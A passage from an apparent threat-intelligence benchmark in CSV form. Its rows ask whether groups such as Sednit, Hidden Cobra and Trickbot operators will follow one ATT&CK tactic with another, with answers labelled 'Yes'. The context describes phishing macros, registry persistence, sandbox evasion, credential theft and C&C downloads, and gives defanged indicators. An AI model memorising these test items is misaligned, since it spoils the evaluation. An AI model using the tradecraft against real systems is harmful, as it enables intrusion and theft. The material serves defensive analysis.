Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
434,154,154-Discovery-T1057-Process Discovery,"After gaining execution through the Delphi downloader utilizing Windows API to execute commands and sending the gathered system information to the C&C server, is it likely that the Sednit group's AutoIt downloader will perform process discovery by gathering process lists from the victim's machine?","Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.
Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
438,154,154-Reconnaissance-T1590-Gather Victim Network Information,"After Zebrocy's attack begins with an email message containing malicious attachments and the documents use methods like VBA, exploits, or DDE to download the first stage payload, is it likely that the Sednit group's malware will subsequently perform activities like detecting sandbox or virtual environments, retrieving a list of installed software, and gathering other reconnaissance data before using the information to proceed with further attack stages?","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.","Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
439,154,154-Reconnaissance-T1591-Gather Victim Org Information,"Is it likely that the Sednit group's malware will perform sandbox and virtual environment detection, retrieve installed software lists, and gather process and hard drive information using the AutoIt downloader during Discovery after launching campaigns with malicious documents containing VBA macros to establish initial access?","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.","Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
452,156,156-Defense Evasion-T1036-Masquerading,"After distributing a malicious app through a website disguised as a charity site supporting North Korean defectors, is it likely that the Geumseong121 APT group disguised the North Korean fundraising apps to evade suspicion before leveraging app functionalities to communicate with Dropbox and Yandex?","Defense Evasion: The attackers made efforts to avoid suspicion by disguising the North Korean fundraising apps as unrelated to previously discovered malicious apps. However, the initial versions of these apps included functionality to communicate with Dropbox and Yandex, and variable declarations used by the malicious apps were almost identical to those found in previous malicious apps.","Reconnaissance: The Geumseong121 APT hacking group carried out a mobile APT attack, distributing a malicious app (APK) via a website disguised as a fundraising service for North Korean defectors. The website, built on the WordPress platform, was created on August 23, 2019, and updated on October 22. The site featured snapshots from September 11 to October, indicating it supported North Korean defectors, and added an Android app installation link in October. The site used various promotion strategies to trick users into installing the app. The operation, named ""Dragon Messenger,"" involved the malicious application collecting data via the 'DragonTask' path and the attack being performed under the guise of a secure messenger.
Initial Access: The malicious app was distributed through a website that appeared to be a charity site supporting North Korean defectors. The app was registered on the official Google Play Store but has since been removed by Google. The app claimed to offer services for North Korean defectors to share life-related issues and specify donation services. The attackers also used YouTube and Facebook to promote the app and prepare the attack, with about 330 friends registered on Facebook, potentially exposing them to threats.
Others: The Geumseong121 APT hacking group targeted Android smartphone users with eavesdropping attacks, attempting to steal SMS, phone address books, eavesdrop on phone conversations, and leak KakaoTalk messages. The 'zombied' smartphones were monitored by attackers for extended periods, often without the victims' knowledge. ESRC is investigating the threat activities of this state-sponsored APT hacking group and has identified several Indicators of Compromise (IoC).",Yes,Dragon Messenger_APT_Group123
456,157,157-Command and Control-T1071-Application Layer Protocol,"After CEIDPageLock collects victim browsing data, is it likely that the driver will connect to C&C hard-coded domains and download the homepage configuration during the process of tampering with the browser?",Command and Control: The driver's main functionality is to connect with one of two C&C hard-coded domains to download the desired homepage configuration to tamper with the browser.,"Initial Access: Over the last few weeks, a rootkit named CEIDPageLock has been distributed by the RIG Exploit kit. The rootkit, first discovered by 360 Security Center, was detected tampering with the homepage of a victim's browser, redirecting it to a site pretending to be 2345.com, a Chinese web directory.
Persistence: The dropper's main responsibility is to extract the driver from the file and save it in the \Windows\Temp directory as houzi.sys. The dropped driver, previously named CEID.sys, has a revoked certificate signed by  [+]  [+] Thawte Code Signing CA  [+] thawte. After registering and starting the driver, the dropper sends the MAC address and user-id of the poisoned computer to the domain www[.]tj999[.]top.
Defense Evasion: The driver is a 32-bit kernel-mode driver that is launched among the standard system drivers during startup. It employs tricks to evade and hide from endpoint security products. The driver connects with one of two C&C hard-coded domains to download the homepage configuration to tamper with the browser. The homepage is downloaded encrypted from the C&C server.
Collection: CEIDPageLock operators gather browsing data on victims, monitoring the sites users visit and the duration of their visits. This information is used to target ad campaigns or sold to other companies for marketing purposes.
Others: CEIDPageLock targets Chinese victims specifically, with a negligible number of infections outside of China. The malware adds a method of creating a registry key in safemon- 360safe's security product, as part of the rootkit installation routine. The rootkit sets the value  [+] 0 under the registry key:  [+] \Registry\Machine\Software\Wow6432Node\360Safe\safemon\ATHPJUMP",Yes,ceidpagelock-a-chinese-rootkit
460,158,158-Reconnaissance-T1591-Gather Victim Org Information,"After Hidden Cobra used the Bankshot malware implant to collect information on victim organizations during their reconnaissance phase, is it likely that the group would proceed to distribute Bankshot implants via a malicious domain resembling a cryptocurrency-lending platform during the resource development phase?","Reconnaissance: On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra's Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim's business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.","Resource Development: Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim's system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Initial Access: Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.
Execution: The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.
Persistence: Bankshot is designed to persist on a victim's network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
Defense Evasion: The Bankshot implant is designed to evade detection and persist on a victim's network for further exploitation. The implant contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Command and Control: The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants' code. The US government reports that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations. This implant has been connected to a major Korean bank attack and is also known as Trojan Manuscript. That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector.
Others: The campaign has a high chance of success against victims who have an unpatched version of Flash. Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal. This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017. McAfee detects these threats as RDN/Generic Exploit, RDN/Generic.dx, Generic PWS.y, Generic.hbg, Exploit-CVE2018-4878. McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk.",Yes,hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant
461,158,158-Reconnaissance-T1589-Gather Victim Identity Information,"After Hidden Cobra targets cryptocurrency and financial organizations to gather victim identity information, is it likely that they will leverage a malicious domain resembling Falcon Coin to distribute Bankshot implants before using spear phishing emails with embedded Flash exploits for initial access?","Reconnaissance: On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra's Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim's business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.","Resource Development: Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim's system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Initial Access: Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.
Execution: The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.
Persistence: Bankshot is designed to persist on a victim's network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
Defense Evasion: The Bankshot implant is designed to evade detection and persist on a victim's network for further exploitation. The implant contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Command and Control: The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants' code. The US government reports that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations. This implant has been connected to a major Korean bank attack and is also known as Trojan Manuscript. That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector.
Others: The campaign has a high chance of success against victims who have an unpatched version of Flash. Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal. This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017. McAfee detects these threats as RDN/Generic Exploit, RDN/Generic.dx, Generic PWS.y, Generic.hbg, Exploit-CVE2018-4878. McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk.",Yes,hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant
462,158,158-Initial Access-T1566-Phishing,"After the Hidden Cobra group used domains impersonating cryptocurrency platforms for hosting Bankshot implants, is it likely that they would target financial organizations with spear phishing emails containing malicious Microsoft Word documents before executing the Bankshot implant through a Flash exploit?","Initial Access: Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.","Reconnaissance: On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra's Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim's business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.
Resource Development: Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim's system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Execution: The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.
Persistence: Bankshot is designed to persist on a victim's network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
Defense Evasion: The Bankshot implant is designed to evade detection and persist on a victim's network for further exploitation. The implant contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Command and Control: The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants' code. The US government reports that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations. This implant has been connected to a major Korean bank attack and is also known as Trojan Manuscript. That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector.
Others: The campaign has a high chance of success against victims who have an unpatched version of Flash. Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal. This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017. McAfee detects these threats as RDN/Generic Exploit, RDN/Generic.dx, Generic PWS.y, Generic.hbg, Exploit-CVE2018-4878. McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk.",Yes,hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant
467,158,158-Resource Development-T1587-Develop Capabilities,"After targeting Turkish financial organizations via spear phishing emails containing a malicious Word document that exploits CVE-2018-4878 for gaining initial access, is it likely that Hidden Cobra will develop the Bankshot implants with capabilities to give attackers full control over victim systems and wipe files from the targeted system under the tactic of Resource Development?","Resource Development: Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim's system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.","Reconnaissance: On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra's Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim's business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.
Initial Access: Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.
Execution: The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.
Persistence: Bankshot is designed to persist on a victim's network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
Defense Evasion: The Bankshot implant is designed to evade detection and persist on a victim's network for further exploitation. The implant contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Command and Control: The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants' code. The US government reports that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations. This implant has been connected to a major Korean bank attack and is also known as Trojan Manuscript. That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector.
Others: The campaign has a high chance of success against victims who have an unpatched version of Flash. Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal. This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017. McAfee detects these threats as RDN/Generic Exploit, RDN/Generic.dx, Generic PWS.y, Generic.hbg, Exploit-CVE2018-4878. McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk.",Yes,hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant
476,16,16-Defense Evasion-T1497-Virtualization/Sandbox Evasion,Is it likely that Trickbot will perform virtualization/sandbox evasion by exhibiting anti-analysis characteristics after executing a heavily obfuscated JavaScript file that drops the Trickbot payload and creates a copy of itself as Shell.jse in the Startup folder?,Defense Evasion: Trickbot exhibits anti-analysis characteristics by checking the total number of running processes on the victim's machine to evade detection. It assumes a virtual or sandbox environment if the process count is below a certain threshold and will not proceed with execution. It also checks for specific analysis-related processes and usernames.,"Initial Access: The Trickbot banking trojan campaign initiates with spam emails containing a Microsoft Word document with an enabled macro. When the document is opened, it drops a heavily obfuscated JavaScript (JS) file designed to download Trickbot as its payload.
Execution: The obfuscated JS file, once executed, displays a fake Microsoft error to mislead the user while the script runs in the background. It creates a copy of itself in the Startup folder as Shell.jse for persistence.
Persistence: For persistence, Trickbot creates a copy of itself in the Startup folder as Shell.jse.
Credential Access: This variant of Trickbot is capable of stealing credentials and information from applications such as Filezilla, Microsoft Outlook, PuTTy, Remote Desktop (RDP), VNC, WinSCP, and internet browsers including Google Chrome, Internet Explorer, Microsoft Edge, and Mozilla Firefox. It gathers data such as autofills, billing information, browsing history, credit card data, HTTP POST responses, internet cookies, usernames, and passwords.
Collection: Trickbot uses a point-of-sale (PoS) extraction module called psfin32 to identify PoS-related terms in the domain of interest. It also drops shadnewdll, a proxy module that intercepts and modifies web traffic to create fraudulent bank transactions.
Command and Control: The malware connects to a URL (hxxps://185[.]159[.]82[.]15/hollyhole/c644[.]php) to download its payload. If the file is executable, it is saved and executed from the %Temp% directory. If not, it is saved as a .cro file, decoded using certutil.exe, and then executed.
Impact: Trickbot deletes files with specific extensions located in removable and network drives, replacing them with a copy of the malware. The targeted file extensions include those used by Microsoft Office and OpenDocument formats.
Others: The Trickbot campaign primarily affected the United States and also targeted China, Canada, and India. The spam emails falsely claim to be subscription notifications and prompt users to view an attached document containing the malicious script. Trend Micro's security solutions can detect and block the malicious files and URLs associated with this campaign. Indicators of Compromise (IoCs) include various SHA-256 hashes and the URL used for downloading the Trickbot payload.",Yes,Latest Trickbot Campaign Delivered via Highly Obfuscated JS File 
480,16,16-Impact-T1485-Data Destruction,"After Trickbot connects to its Command and Control server to download and execute its payload, is it likely that it will proceed to delete files with specific extensions located in removable and network drives as part of its impact tactics?","Impact: Trickbot deletes files with specific extensions located in removable and network drives, replacing them with a copy of the malware. The targeted file extensions include those used by Microsoft Office and OpenDocument formats.","Initial Access: The Trickbot banking trojan campaign initiates with spam emails containing a Microsoft Word document with an enabled macro. When the document is opened, it drops a heavily obfuscated JavaScript (JS) file designed to download Trickbot as its payload.
Execution: The obfuscated JS file, once executed, displays a fake Microsoft error to mislead the user while the script runs in the background. It creates a copy of itself in the Startup folder as Shell.jse for persistence.
Persistence: For persistence, Trickbot creates a copy of itself in the Startup folder as Shell.jse.
Defense Evasion: Trickbot exhibits anti-analysis characteristics by checking the total number of running processes on the victim's machine to evade detection. It assumes a virtual or sandbox environment if the process count is below a certain threshold and will not proceed with execution. It also checks for specific analysis-related processes and usernames.
Credential Access: This variant of Trickbot is capable of stealing credentials and information from applications such as Filezilla, Microsoft Outlook, PuTTy, Remote Desktop (RDP), VNC, WinSCP, and internet browsers including Google Chrome, Internet Explorer, Microsoft Edge, and Mozilla Firefox. It gathers data such as autofills, billing information, browsing history, credit card data, HTTP POST responses, internet cookies, usernames, and passwords.
